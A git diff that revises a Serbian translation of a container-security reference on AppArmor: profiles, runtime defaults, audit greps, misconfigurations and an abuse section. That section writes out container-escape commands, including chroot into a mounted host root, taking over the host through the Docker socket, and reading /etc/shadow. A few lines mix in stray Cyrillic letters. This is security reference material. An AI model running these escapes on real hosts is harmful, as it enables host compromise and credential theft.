@@ -4,27 +4,27 @@
 
 ## Pregled
 
-AppArmor je sistem **Obavezne kontrole pristupa** koji primenjuje ograničenja putem profila po programu. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupe, AppArmor omogućava kernelu da sprovede politiku vezanu za sam proces. U okruženjima sa kontejnerima, ovo je važno jer workload može imati dovoljno tradicionalnih privilegija da pokuša neku akciju, a ipak mu bude odbijeno jer njegov AppArmor profil ne dozvoljava odgovarajuću putanju, mount, mrežno ponašanje ili korišćenje capability-ja.
+AppArmor je sistem **Mandatory Access Control** koji primenjuje ograničenja putem profila po programu. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva po korisniku i grupi, AppArmor omogućava kernelu da sprovodi politiku vezanu za sam proces. U okruženjima sa containerima ovo je važno zato što workload može imati dovoljno tradicionalnih privilegija да pokuša neku akciju, a ipak biti odbijen zato što njegov AppArmor profil ne dozvoljava odgovarajući path, mount, network behavior, ili korišćenje capability.
 
-Najvažnija konceptualna tačka je da je AppArmor **baziran na putanjama**. On razmatra pristup fajl sistemu putem pravila o putanjama umesto kroz labels kao što radi SELinux. To ga čini pristupačnim i moćnim, ali isto tako znači da bind mounts i alternativni rasporedi putanja zaslužuju posebnu pažnju. Ako isti sadržaj hosta postane dostupan pod drugačijom putanjom, efekat politike možda neće biti onakav kakav je operater prvobitno očekivao.
+Najvažnija konceptualna tačka je da je AppArmor **path-based**. On razmatra pristup filesystem-u kroz pravila zasnovana na path-ovima umesto kroz label-e kao što to radi SELinux. To ga čini pristupačnim i moćnim, ali isto tako znači da bind mounts i alternativne raspodele path-ova zaslužuju pažnju. Ako isti sadržaj host-a postane dostupan pod drugačijim path-om, efekat politike možda neće biti onakav kakav je operator prvobitno očekivao.
 
 ## Uloga u izolaciji kontejnera
 
-Pregledi bezbednosti kontejnera često se zaustave na capabilities i seccomp, ali AppArmor ostaje važan i nakon tih provera. Zamislite kontejner koji ima više privilegija nego što bi trebalo, ili workload kojem je zbog operativnih razloga bila potrebna jedna dodatna capability. AppArmor i dalje može da ograniči pristup fajlovima, ponašanje mount-a, mrežu i obrasce izvršavanja na načine koji zaustavljaju očigledan put zloupotrebe. Zato onemogućavanje AppArmor-a "samo da bi aplikacija radila" može neprimetno pretvoriti rizičnu konfiguraciju u onu koja je aktivno eksploatabilna.
+Pregledi bezbednosti kontejnera često se zaustave na capabilities i seccomp, ali AppArmor ostaje važan i posle tih provera. Zamislite container koji ima više privilegija nego što bi trebao, ili workload kojem je iz operativnih razloga trebala još jedna capability. AppArmor i dalje može da ograniči pristup fajlovima, ponašanje mount-a, networking i obrasce izvršavanja na načine koji zaustavljaju očigledan abuse path. Zato isključivanje AppArmor-a "just to get the application working" može tiho pretvoriti konfiguraciju koja je bila samo rizična u onu koja je aktivno exploitable.
 
-## Laboratorija
+## Lab
 
 Da biste proverili da li je AppArmor aktivan na hostu, koristite:
 ```bash
 aa-status 2>/dev/null || apparmor_status 2>/dev/null
 cat /sys/module/apparmor/parameters/enabled 2>/dev/null
 ```
-Da biste videli pod čime se pokreće trenutni container process:
+Da biste videli pod kojim korisnikom radi trenutni proces u kontejneru:
 ```bash
 docker run --rm ubuntu:24.04 cat /proc/self/attr/current
 docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
 ```
-Razlika je poučna. U normalnom slučaju, proces bi trebalo da prikaže AppArmor kontekst povezan sa profilom koji runtime izabere. U unconfined slučaju, taj dodatni sloj ograničenja nestaje.
+Razlika je poučna. U normalnom slučaju, proces bi trebalo da prikaže AppArmor kontekst vezan za profil koji je runtime odabrao. U slučaju unconfined, taj dodatni sloj ograničenja nestaje.
 
 Takođe možete proveriti šta Docker misli da je primenio:
 ```bash
@@ -32,21 +32,21 @@ docker inspect <container> | jq '.[0].AppArmorProfile'
 ```
 ## Korišćenje u runtime-u
 
-Docker može primeniti podrazumevani ili prilagođeni AppArmor profil kada host to podržava. Podman se takođe može integrisati sa AppArmor na sistemima zasnovanim na AppArmor, iako na distribucijama koje prioritizuju SELinux drugi MAC sistem često preuzme glavnu ulogu. Kubernetes može izložiti AppArmor politiku na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna system-container okruženja iz familije Ubuntu takođe široko koriste AppArmor.
+Docker može primeniti podrazumevani ili prilagođeni AppArmor profil kada host to podržava. Podman se takođe može integrisati sa AppArmor na sistemima zasnovanim na AppArmor, iako na distribucijama koje imaju SELinux kao primarni MAC sistem često on preuzme glavnu ulogu. Kubernetes može izložiti AppArmor politiku na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna Ubuntu-family system-container okruženja takođe široko koriste AppArmor.
 
-Praktično gledano, AppArmor nije "Docker feature". To je host-kernel funkcionalnost koju različiti runtimes mogu izabrati da primene. Ako host to ne podržava ili je runtime naloženo da radi unconfined, navodna zaštita zapravo ne postoji.
+Praktično, AppArmor nije "Docker feature". To je host-kernel funkcionalnost koju mogu primeniti različiti runtimes. Ako host ne podržava AppArmor ili je runtime pokrenut kao unconfined, navodna zaštita zapravo ne postoji.
 
-Što se tiče Kubernetes-a, moderna API je `securityContext.appArmorProfile`. Od Kubernetes `v1.30`, starije beta AppArmor anotacije su deprecated. Na podržanim hostovima, `RuntimeDefault` je podrazumevani profil, dok `Localhost` upućuje na profil koji mora već biti učitan na čvoru. Ovo je važno pri reviziji jer manifest može delovati AppArmor-svestan, a ipak u potpunosti zavisi od podrške na strani čvora i prethodno učitanih profila.
+Za Kubernetes posebno, moderan API je `securityContext.appArmorProfile`. Od Kubernetes `v1.30`, starije beta AppArmor anotacije su zastarele. Na hostovima koji podržavaju AppArmor, `RuntimeDefault` je podrazumevani profil, dok `Localhost` pokazuje na profil koji mora već biti učitan na čvoru. Ovo je važno pri reviziji jer manifest može izgledati AppArmor-svestan dok u stvari u potpunosti zavisi od podrške i prethodno učitanih profila na čvoru.
 
-Jedna suptilna ali korisna operativna pojedinost je da eksplicitno postavljanje `appArmorProfile.type: RuntimeDefault` predstavlja strožu politiku nego jednostavno izostavljanje tog polja. Ako je polje eksplicitno postavljeno i čvor ne podržava AppArmor, admission bi trebalo da odbije zahtev. Ako je polje izostavljeno, workload i dalje može pokrenuti na čvoru bez AppArmor i jednostavno neće dobiti taj dodatni nivo ograničenja. Sa stanovišta napadača, ovo je dobar razlog da se provere i manifest i stvarno stanje čvora.
+Jedan suptilan ali koristan operativni detalj je da eksplicitno postavljanje `appArmorProfile.type: RuntimeDefault` strože nego jednostavno izostavljanje tog polja. Ako je polje eksplicitno postavljeno i čvor ne podržava AppArmor, admission bi trebao da ne uspe. Ako je polje izostavljeno, workload i dalje može da se pokrene na čvoru bez AppArmor i jednostavno neće dobiti taj dodatni sloj ograničenja. Iz ugla napadača, to je dobar razlog da se provere i manifest i stvarno stanje čvora.
 
-Na hostovima koji podržavaju Docker i AppArmor, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby-jevog AppArmor template-a i važan je jer objašnjava zašto neki PoC-ovi zasnovani na capability-ima i dalje ne uspevaju u podrazumevanom containeru. U širokim crtama, `docker-default` dozvoljava uobičajeno umrežavanje, zabranjuje upise u veći deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da on nije opšta primitivna tehnika sondiranja hosta. Razumevanje te osnovne postavke pomaže da se razlikuje "kontejner ima `CAP_SYS_ADMIN`" od "kontejner zapravo može iskoristiti tu capability protiv kernel interfejsa koji su mi bitni".
+Na hostovima sa podrškom za Docker i AppArmor, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby-jevog AppArmor templata i važan je jer objašnjava zašto neki PoC-ovi zasnovani na capabilities i dalje ne uspevaju u podrazumevanom containeru. U širokim crtama, `docker-default` dopušta običan networking, zabranjuje pisanja u veliki deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da nije opšti primitiv za ispitivanje hosta. Razumevanje te osnovne postavke pomaže da se razlikuje "kontejner ima `CAP_SYS_ADMIN`" od "kontejner zapravo može iskoristiti tu capability protiv kernel interfejsa koji su mi bitni".
 
 ## Upravljanje profilima
 
-AppArmor profili se obično čuvaju pod `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je da se kosa crta u putanji izvršnog fajla zameni tačkama. Na primer, profil za `/usr/bin/man` je često smešten kao `/etc/apparmor.d/usr.bin.man`. Ova pojedinost je važna i za odbranu i za procenu jer, kad jednom znate aktivno ime profila, često brzo možete pronaći odgovarajući fajl na hostu.
+AppArmor profili se obično čuvaju u `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je da se kose crte u putanji izvršnog fajla zamene tačkama. Na primer, profil za `/usr/bin/man` se često čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je bitan i za odbranu i za procenu jer kada jednom znate ime aktivnog profila, često brzo možete pronaći odgovarajući fajl na hostu.
 
-Korisne komande za upravljanje na strani hosta uključuju:
+Korисни host-side management команде укључују:
 ```bash
 aa-status
 aa-enforce
@@ -56,74 +56,74 @@ aa-genprof
 aa-logprof
 aa-mergeprof
 ```
-Razlog zbog kojeg su ove komande važne u referenci za container-security je što objašnjavaju kako se profili zapravo grade, učitavaju, prebacuju u complain mode i menjaju nakon promena u aplikaciji. Ako operator ima naviku da tokom rešavanja problema prebacuje profile u complain mode i zaboravlja da vrati enforcement, kontejner može izgledati zaštićen u dokumentaciji, dok se u stvarnosti ponaša mnogo labavije.
+Razlog zašto su ove komande bitne u referenci o bezbednosti kontejnera je što objašnjavaju kako se profili zapravo kreiraju, učitavaju, prebacuju u complain mode, i menjaju nakon izmena aplikacije. Ako operator ima običaj da tokom otklanjanja problema prebaci profile u complain mode i zaboravi da vrati enforcement, kontejner može u dokumentaciji delovati zaštićeno, dok u stvarnosti radi mnogo labavije.
 
 ### Izgradnja i ažuriranje profila
 
-`aa-genprof` može posmatrati ponašanje aplikacije i pomoći pri interaktivnom generisanju profila:
+`aa-genprof` može da posmatra ponašanje aplikacije i interaktivno pomogne pri generisanju profila:
 ```bash
 sudo aa-genprof /path/to/binary
 /path/to/binary
 ```
-`aa-easyprof` može da generiše predložak profila koji se kasnije može učitati pomoću `apparmor_parser`:
+`aa-easyprof` može generisati šablon profila koji se kasnije može učitati pomoću `apparmor_parser`:
 ```bash
 sudo aa-easyprof /path/to/binary
 sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
 ```
-Kada se binarni fajl promeni i politika treba ažuriranje, `aa-logprof` može ponovo reproducirati odbijanja pronađena u logovima i pomoći operatoru da odluči da li da ih dozvoli ili odbije:
+Kada se binarni fajl promeni i politika treba da se ažurira, `aa-logprof` može da reprodukuje odbijanja zabeležena u logovima i pomogne operateru da odluči da li da ih dozvoli ili odbije:
 ```bash
 sudo aa-logprof
 ```
 ### Logovi
 
-Odbijanja AppArmor-a se često vide kroz `auditd`, syslog, ili alate kao što je `aa-notify`:
+Odbijanja od strane AppArmor-a često su vidljiva kroz `auditd`, syslog, ili alate kao što je `aa-notify`:
 ```bash
 sudo aa-notify -s 1 -v
 ```
-Ovo je korisno u operativne i ofanzivne svrhe. Odbrambeni timovi ga koriste da unaprede profile. Napadači ga koriste da saznaju tačno koji put ili operacija se odbija i da li AppArmor predstavlja kontrolu koja blokira exploit chain.
+Ovo je korisno operativno i ofanzivno. Odbrambeni timovi ga koriste da usavrše profile. Napadači ga koriste da otkriju koji tačan put ili operacija se odbija i da li je AppArmor kontrola koja blokira lanac exploita.
 
 ### Identifikacija tačne datoteke profila
 
-Kada runtime prikaže određeno AppArmor ime profila za container, često je korisno povezati to ime sa datotekom profila na disku:
+Kada runtime prikaže konkretno ime AppArmor profila za container, često je korisno mapirati to ime nazad na datoteku profila na disku:
 ```bash
 docker inspect <container> | grep AppArmorProfile
 find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
 ```
-Ovo je naročito korisno tokom pregleda na hostu jer premošćava jaz između "the container says it is running under profile `lowpriv`" i "the actual rules live in this specific file that can be audited or reloaded".
+Ovo je posebno korisno tokom pregleda na hostu jer premošćava jaz između „kontejner kaže da radi pod profilom `lowpriv`“ i „stvarna pravila se nalaze u ovom konkretnom fajlu koji može biti revidiran ili ponovo učitan“.
 
-### Ključna pravila za reviziju
+### Pravila visokog značaja za reviziju
 
-When you can read a profile, do not stop at simple `deny` lines. Several rule types materially change how useful AppArmor will be against a container escape attempt:
+Kada možete pročitati profil, ne zaustavljajte se na prostim `deny` linijama. Nekoliko tipova pravila u značajnoj meri menja koliko će AppArmor biti efikasan protiv pokušaja container escape:
 
-- `ux` / `Ux`: izvršava ciljni binarni fajl bez ograničenja. Ako je pod `ux` dozvoljen pristupačan pomoćni program, shell ili interpreter, to je obično prva stvar koju treba testirati.
-- `px` / `Px` i `cx` / `Cx`: vrše promene profila pri exec. Ovo nije automatski loše, ali vredi proveriti jer prelazak može završiti u znatno širem profilu nego trenutni.
-- `change_profile`: omogućava procesu da pređe u drugi učitani profil, odmah ili pri sledećem exec. Ako je ciljni profil slabiji, ovo može postati predviđeni izlaz iz restriktivnog domena.
-- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ovo treba da promeni koliko poverenja ukazujete profilu. `complain` beleži odbijanja umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od odluke u korisničkom prostoru umesto čistog kernel-om nametnutog odbijanja.
-- `userns` or `userns create,`: novija AppArmor politika može posredovati pri kreiranju user namespaces. Ako kontejner profil eksplicitno dozvoljava, ugnježdene user namespaces ostaju moguće čak i kada platforma koristi AppArmor kao deo svoje strategije hardeninga.
+- `ux` / `Ux`: izvršava ciljanu binarnu datoteku bez ograničenja. Ako je pod `ux` dozvoljen dostupan helper, shell ili interpreter, to je obično prva stvar koju treba testirati.
+- `px` / `Px` i `cx` / `Cx`: izvršavaju prelaze profila on exec. Ovo nije automatski loše, ali vredi ih revidirati zato što prelaz može dospeti u znatno širi profil nego trenutni.
+- `change_profile`: dozvoljava zadatku da se prebaci u drugi učitani profil, odmah ili pri sledećem exec. Ako je odredišni profil slabiji, ovo može postati predviđeni izlaz iz restriktivnog domena.
+- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ovo treba da promeni koliko poverenja imate u profil. `complain` beleži odbijanja umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od userspace odluke umesto od striktne kernel-nametnute zabrane.
+- `userns` or `userns create,`: novija AppArmor politika može posredovati u kreiranju user namespaces. Ako kontejner profil eksplicitno to dozvoljava, ugnježdeni user namespaces ostaju u igri čak i kada platforma koristi AppArmor kao deo svoje hardening strategije.
 
-Korisno grep na hostu:
+Korisne host-side grep:
 ```bash
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
-Ovakav audit je često korisniji nego buljenje u stotine običnih file pravila. Ako breakout zavisi od izvršavanja helper-a, ulaska u novi namespace, ili bekstva u manje restriktivni profil, odgovor je često skriven u pravilima usmerenim na te tranzicije, a ne u očiglednim linijama tipa `deny /etc/shadow r`.
+Ovakva vrsta audita često je korisnija nego zurenje u stotine običnih pravila za fajlove. Ako breakout zavisi od izvršavanja helpera, ulaska u novi namespace, ili bekstva u manje restriktivan profil, odgovor je često sakriven u pravilima usmerenim na tranzicije umesto u očiglednim linijama tipa `deny /etc/shadow r`.
 
 ## Pogrešne konfiguracije
 
-Najočiglednija greška je `apparmor=unconfined`. Administratori ga često postave tokom debugovanja aplikacije koja je zakazala zato što je profil ispravno blokirao nešto opasno ili neočekivano. Ako zastavica ostane u produkciji, ceo MAC sloj je efektivno uklonjen.
+Najočiglednija greška je `apparmor=unconfined`. Administratori to često uključe dok otklanjaju greške u aplikaciji koja je propala jer ju je profil ispravno blokirao zbog nečeg opasnog ili neočekivanog. Ako zastavica ostane u produkciji, čitav MAC sloj je efektivno uklonjen.
 
-Još jedan suptilan problem je pretpostavka da su bind mounts bezopasni zato što dozvole fajlova izgledaju normalno. Pošto je AppArmor baziran na putanjama, izlaganje host paths pod alternativnim mount lokacijama može loše da interaguje sa path rules. Treća greška je zaboraviti da ime profila u config file znači vrlo malo ako host kernel zapravo ne nameće AppArmor.
+Drugi suptilni problem je pretpostavka da su bind mounts bezopasni zato što prava fajlova izgledaju normalno. Pošto je AppArmor path-based, izlaganje host putanja pod alternativnim mount lokacijama može loše da se preklopi sa pravilima za putanje. Treća greška je zaborav da ime profila u konfiguracionom fajlu znači vrlo malo ako host kernel zapravo ne sprovodi AppArmor.
 
 ## Zloupotreba
 
-Kada AppArmor nestane, operacije koje su prethodno bile ograničene mogu iznenada početi da rade: čitanje osetljivih putanja preko bind mounts, pristup delovima procfs ili sysfs koji bi trebalo da ostanu teže dostupni, izvršavanje radnji vezanih za mount ako capabilities/seccomp to takođe dozvoljavaju, ili korišćenje putanja koje bi profil inače odbio. AppArmor je često mehanizam koji objašnjava zašto pokušaj breakout-a zasnovan na capabilities "trebao bi raditi" na papiru ali i dalje ne uspeva u praksi. Uklonite AppArmor, i isti pokušaj može početi da uspeva.
+Kada AppArmor nije prisutan, operacije koje su ranije bile ograničene mogu odjednom početi da rade: čitanje osetljivih putanja preko bind mounts, pristup delovima procfs ili sysfs koji su trebali ostati teže dostupni, izvršavanje radnji povezanih sa mount-ovanjem ako capabilities/seccomp to takođe dozvoljavaju, ili korišćenje putanja koje bi profil inače odbio. AppArmor često objašnjava zašto pokušaj breakout-a zasnovan na capabilities "na papiru treba da radi", a ipak u praksi zakaže. Uklonite AppArmor i isti pokušaj može početi da uspeva.
 
-Ako sumnjate da je AppArmor glavni razlog zbog kog je zaustavljen path-traversal, bind-mount, ili mount-based abuse lanac, prvi korak je obično da uporedite šta postaje dostupno sa profilom i bez profila. Na primer, ako je host path montiran unutar container-a, počnite proverom da li možete da traversirate i pročitate ga:
+Ako sumnjate da je AppArmor glavni uzrok koji sprečava path-traversal, bind-mount, ili mount-based lanac zloupotrebe, prvi korak je obično da uporedite šta postaje dostupno sa i bez profila. Na primer, ako je host path mount-ovan unutar containera, počnite tako što ćete proveriti da li možete da mu pristupite i da ga pročitate:
 ```bash
 cat /proc/self/attr/current
 find /host -maxdepth 2 -ls 2>/dev/null | head
 find /host/etc -maxdepth 1 -type f 2>/dev/null | head
 ```
-Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova je da li AppArmor predstavlja kontrolu koja blokira mount operacije ili pristup osetljivim kernel datotečnim sistemima:
+Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova je proveriti da li AppArmor predstavlja kontrolu koja blokira mount operacije ili pristup osetljivim kernel datotečnim sistemima:
 ```bash
 capsh --print | grep cap_sys_admin
 mount | head
@@ -131,50 +131,50 @@ mkdir -p /tmp/testmnt
 mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
 mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
 ```
-U okruženjima gde je host path već dostupan putem bind mount-a, gubitak AppArmor-a takođe može pretvoriti read-only information-disclosure problem u direktan pristup fajlovima na hostu:
+U okruženjima gde je host path već dostupan kroz bind mount, gubitak AppArmor-a može takođe pretvoriti read-only information-disclosure issue u direktan host file access:
 ```bash
 ls -la /host/root 2>/dev/null
 cat /host/etc/shadow 2>/dev/null | head
 find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
 ```
-Poenta ovih komandi nije da AppArmor sam stvara breakout. Poenta je da, kada se AppArmor ukloni, mnogi filesystem i mount-based putevi zloupotrebe postanu odmah testabilni.
+Poenta ovih komandi nije da AppArmor sam po sebi stvara breakout. Radi se o tome da, kada se AppArmor ukloni, mnogi filesystem i mount-based putevi zloupotrebe postanu odmah testabilni.
 
-### Potpun primer: AppArmor Disabled + Host Root Mounted
+### Potpun primer: AppArmor onemogućen + host root montiran
 
-Ako kontejner već ima host root bind-mounted na `/host`, uklanjanje AppArmor-a može pretvoriti blokiran filesystem abuse path u potpun host escape:
+Ako kontejner već ima host root bind-mounted na `/host`, uklanjanje AppArmor-a može pretvoriti blokiran filesystem abuse path u kompletan host escape:
 ```bash
 cat /proc/self/attr/current
 ls -la /host
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Kada se shell izvršava kroz host filesystem, workload je efektivno pobegao iz granica containera:
+Kada se shell izvršava kroz host filesystem, workload je efektivno pobegao iz container boundary:
 ```bash
 id
 hostname
 cat /etc/shadow | head
 ```
-### Kompletan primer: AppArmor onemogućen + Runtime socket
+### Potpun primer: AppArmor onemogućen + Runtime Socket
 
-Ako je stvarna barijera bio AppArmor koji štiti runtime state, montiran socket može biti dovoljan za complete escape:
+Ako je stvarna barijera bio AppArmor oko runtime state, montiran socket može biti dovoljan za potpun escape:
 ```bash
 find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
 docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-Tačan put zavisi od tačke montiranja, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, i runtime API može pokrenuti container koji kompromituje host.
+Tačan put zavisi od mount point-a, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, i runtime API može pokrenuti container koji kompromituje host.
 
 ### Potpun primer: Path-Based Bind-Mount Bypass
 
-Pošto je AppArmor baziran na putanjama, zaštita `/proc/**` ne štiti automatski isti host procfs sadržaj kada je dostupan kroz drugu putanju:
+Zato što je AppArmor zasnovan na putanjama, zaštita `/proc/**` ne štiti automatski isti procfs sadržaj hosta kada mu se pristupi kroz drugačiji put:
 ```bash
 mount | grep '/host/proc'
 find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
 cat /host/proc/sys/kernel/core_pattern 2>/dev/null
 ```
-Uticaj zavisi od toga šta je tačno mounted i da li alternativni put takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najozbiljnijih razloga zbog kojih AppArmor treba procenjivati zajedno sa mount layout, a ne izolovano.
+Uticaj zavisi od toga šta je tačno montirano i da li alternativni put takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najočiglednijih razloga zašto AppArmor mora biti ocenjen zajedno sa rasporedom montiranja umesto izolovano.
 
-### Potpuni primer: Shebang Bypass
+### Potpun primer: Shebang Bypass
 
-AppArmor policy ponekad cilja interpreter path na način koji ne uzima u potpunosti u obzir izvršavanje script-a kroz shebang handling. Istorijski primer uključivao je korišćenje script-a čija prva linija pokazuje na confined interpreter:
+AppArmor politika ponekad cilja putanju interpretera na način koji ne uzima u potpunosti u obzir izvršavanje skripti kroz rukovanje shebang-om. Istorijski primer uključivao je korišćenje skripte čija prva linija ukazuje na ograničeni interpreter:
 ```bash
 cat <<'EOF' > /tmp/test.pl
 #!/usr/bin/perl
@@ -185,7 +185,7 @@ EOF
 chmod +x /tmp/test.pl
 /tmp/test.pl
 ```
-Ovakav primer je važan podsetnik da se namera profila i stvarna semantika izvršavanja mogu razlikovati. Prilikom pregleda AppArmor-a u container okruženjima, lanci interpretera i alternativni putevi izvršavanja zaslužuju posebnu pažnju.
+Ovakav primer je važan podsetnik da se namera profila i stvarna semantika izvršavanja mogu razići. Prilikom pregleda AppArmor-a u container okruženjima, interpreter chains i alternate execution paths zaslužuju posebnu pažnju.
 
 ## Provere
 
@@ -198,26 +198,26 @@ find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side 
 cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
-Šta je zanimljivo ovde:
+Zanimljivo ovde:
 
-- Ako `/proc/self/attr/current` prikazuje `unconfined`, radno opterećenje ne koristi AppArmor ograničenje.
-- Ako `aa-status` prikazuje AppArmor onemogućen ili nije učitan, bilo koje ime profila u runtime konfiguraciji je uglavnom kozmetičko.
-- Ako `docker inspect` prikazuje `unconfined` ili neočekivani custom profile, to je često razlog zašto putanja zloupotrebe zasnovana na filesystem-u ili mount-u funkcioniše.
-- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, runtime ili konfiguracija orchestratora sama po sebi nije dovoljna.
-- Ako navodno ojačan profil sadrži `ux`, široke `change_profile`, `userns`, ili `flags=(complain)` tip pravila, praktična granica može biti znatno slabija nego što ime profila sugeriše.
+- Ako `/proc/self/attr/current` prikazuje `unconfined`, radno opterećenje ne koristi AppArmor izolaciju.
+- Ako `aa-status` prikazuje AppArmor disabled ili not loaded, bilo koji naziv profila u runtime konfiguraciji je uglavnom kozmetički.
+- Ako `docker inspect` prikazuje `unconfined` ili neočekivani custom profile, to je često razlog zašto filesystem- ili mount-bazirana putanja zloupotrebe funkcioniše.
+- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, runtime ili konfiguracija orkestratora sama po sebi nije dovoljna.
+- Ako navodno ojačani profil sadrži `ux`, široka pravila `change_profile`, `userns`, ili `flags=(complain)` tipa, praktična granica može biti mnogo slabija nego što ime profila sugeriše.
 
-Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor-a omogućenim često pravi razliku između kontrolisanog izuzetka i mnogo šire sigurnosne propasti.
+Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor uključenim često pravi razliku između kontrolisanog izuzetka i mnogo šire bezbednosne propasti.
 
-## Podrazumevana podešavanja runtime-a
+## Runtime Defaults
 
-| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
+| Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Docker Engine | Podrazumevano omogućen na AppArmor-capable hostovima | Koristi `docker-default` AppArmor profil osim ako nije nadjačan | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Podman | Zavisi od hosta | AppArmor je podržan kroz `--security-opt`, ali tačan default zavisi od hosta/runtime-a i manje je univerzalan od Docker-ovog dokumentovanog `docker-default` profila | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije specificiran, default je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
-| containerd / CRI-O under Kubernetes | Prati podršku čvora/runtime-a | Uobičajeni runtime-ovi podržani od strane Kubernetes-a podržavaju AppArmor, ali stvarno sprovođenje i dalje zavisi od podrške čvora i podešavanja workload-a | Isto kao u Kubernetes redu; direktna runtime konfiguracija takođe može potpuno zaobići AppArmor |
+| Docker Engine | Podrazumevano omogućeno na hostovima koji podržavaju AppArmor | Koristi `docker-default` AppArmor profil osim ako nije prebrisano | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Podman | Zavisno od hosta | AppArmor se podržava preko `--security-opt`, ali tačan podrazumevani izbor zavisi od hosta/runtime-a i manje je univerzalan nego Docker-ov dokumentovani `docker-default` profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije specificiran, podrazumevano je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućен na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
+| containerd / CRI-O under Kubernetes | Sledi podršku čvora/runtime-a | Uobičajeni runtime-i podržani pod Kubernetes-om podržavaju AppArmor, ali stvarno sprovođenje i dalje zavisi od podrške čvora i podešavanja radnog opterećenja | Isto kao u Kubernetes redu; direktna runtime konfiguracija takođe može potpuno preskočiti AppArmor |
 
-Za AppArmor, najvažnija varijabla je često **host**, a ne samo runtime. Podešavanje profila u manifestu ne stvara ograničenje na čvoru gde AppArmor nije omogućen.
+Za AppArmor, najvažnija varijabla je često **host**, ne samo runtime. Podešavanje profila u manifestu ne stvara izolaciju na čvoru gde AppArmor nije omogućen.
 
 ## References
 
